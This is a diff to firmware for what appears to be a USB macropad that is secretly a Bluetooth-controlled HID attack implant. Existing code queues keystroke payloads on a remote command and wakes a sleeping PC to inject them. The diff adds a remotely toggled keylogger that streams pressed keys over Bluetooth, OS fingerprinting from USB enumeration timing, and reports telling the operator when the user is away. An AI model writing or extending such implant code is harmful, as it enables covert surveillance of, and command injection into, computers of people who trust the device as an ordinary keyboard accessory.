@@ -16,10 +16,8 @@
 #define BT_TX_PIN 0
 #define BT_RX_PIN 1
 
-/* How long a key's LED stays white after being pressed (ms) */
 #define KEY_LIGHT_MS 100
 
-/* LED update rate — neopixel_show() blocks ~330 µs so don't call every loop */
 #define LED_UPDATE_MS 10
 
 static volatile bool reenumerate_pending = false;
@@ -32,6 +30,13 @@ static bool idle_notified = false; /* have we already sent the BT trigger? */
 static bool suspended = false;     /* is the USB bus currently suspended?  */
 
 static volatile bool payload_after_wakeup = false;
+static volatile bool keylog_active = false;
+static volatile bool sendOSInfo = false;
+
+/* OS fingerprinting */
+static uint32_t connect_start_ms = 0; /* when we started waiting for mount */
+static uint32_t connect_time_ms = 0;  /* when mount completed */
+static bool os_reported = false;
 
 /* Required TinyUSB callbacks */
 uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
@@ -56,28 +61,39 @@ void tud_hid_report_complete_cb(uint8_t instance, uint8_t const *report,
 }
 
 /* Invoked when device is mounted */
-void tud_mount_cb(void) { gpio_put(LED_PIN, 1); }
+void tud_mount_cb(void)
+{
+  gpio_put(LED_PIN, 1);
+  connect_time_ms = board_millis();
+  os_reported = false;
+}
 
 /* Invoked when device is unmounted */
-void tud_umount_cb(void) { gpio_put(LED_PIN, 0); }
+void tud_umount_cb(void)
+{
+  gpio_put(LED_PIN, 0);
+  connect_start_ms = board_millis();
+  os_windows_probe = false;
+  os_descriptor_count = 0;
+}
 
 /* invoked when the USB bus suspends */
 void tud_suspend_cb(bool remote_wakeup_en)
 {
   (void)remote_wakeup_en;
   suspended = true;
-  uart_putc(BT_UART, 'S'); /* notify BT: user is away */
+  uart_puts(BT_UART, "USER AFK");
 }
 
 /* Invoked when USB bus is resumed */
 void tud_resume_cb(void)
 {
   suspended = false;
-  uart_putc(BT_UART, 'R'); /* notify BT: user is back */
+  uart_puts(BT_UART, "USER PRESENT");
   if (payload_after_wakeup)
   {
     payload_after_wakeup = false;
-    payload_pending = true; /* bus is live again, safe to send HID */
+    payload_pending = true;
   }
 }
 
@@ -90,14 +106,18 @@ void handleUartRx(void)
     {
       if (suspended)
       {
-        payload_after_wakeup = true; /* can't send HID yet */
-        tud_remote_wakeup();         /* wake the PC first  */
+        payload_after_wakeup = true;
+        tud_remote_wakeup();
       }
       else
         payload_pending = true;
     }
     else if (cmd == '2')
       reenumerate_pending = true;
+    else if (cmd == '3')
+      keylog_active = !keylog_active;
+    else if (cmd == '4')
+      os_reported = false;
   }
 }
 
@@ -112,6 +132,7 @@ int main(void)
     board_init_after_tusb();
   }
   sleep_ms(500);
+  connect_start_ms = board_millis();
 
   /* GPIO setup */
   gpio_init(LED_PIN);
@@ -163,28 +184,49 @@ int main(void)
         reEnumerate(MSC);
     }
 
+    if (!os_reported && connect_time_ms > 0 &&
+        (board_millis() - connect_time_ms) > 500)
+    {
+      os_reported = true;
+      uint32_t enum_ms = connect_time_ms - connect_start_ms;
+      if (os_windows_probe || os_descriptor_count >= 5)
+        uart_puts(BT_UART, "OS:WINDOWS");
+      else if (enum_ms < 800)
+        uart_puts(BT_UART, "OS:LINUX");
+      else
+        uart_puts(BT_UART, "OS:MACOS");
+    }
+
     /* Macropad key scanning */
     uint32_t now = board_millis();
     for (int i = 0; i < KEY_COUNT; i++)
     {
       bool pressed = !gpio_get(key_pins[i]); /* active-low */
-      if (pressed && !key_prev[i] &&
-          (now - key_last_time[i]) >= KEY_DEBOUNCE_MS)
+      if (pressed != key_prev[i] && (now - key_last_time[i]) >= KEY_DEBOUNCE_MS)
       {
-        sendKey(keymap[i].modifier, keymap[i].keycode);
         key_last_time[i] = now;
-        key_light_time[i] = now; /* start white burst */
-        last_activity_ms = now;
-        idle_notified = false; /* user is back, reset trigger */
+        key_prev[i] = pressed;
+        if (pressed)
+        {
+          sendKey(keymap[i].modifier, keymap[i].keycode);
+          if (keylog_active)
+          {
+            char c = hid_to_ascii(keymap[i].keycode);
+            if (c)
+              uart_putc(BT_UART, c);
+          }
+          key_light_time[i] = now;
+          last_activity_ms = now;
+          idle_notified = false;
+        }
       }
-      key_prev[i] = pressed;
     }
 
     /* Inactivity check */
     if (!idle_notified && !suspended &&
         (board_millis() - last_activity_ms) > IDLE_TIMEOUT_MS)
     {
-      uart_putc(BT_UART, 'S');
+      uart_puts(BT_UART, "DEVICE INACTIVE");
       idle_notified = true;
     }
 
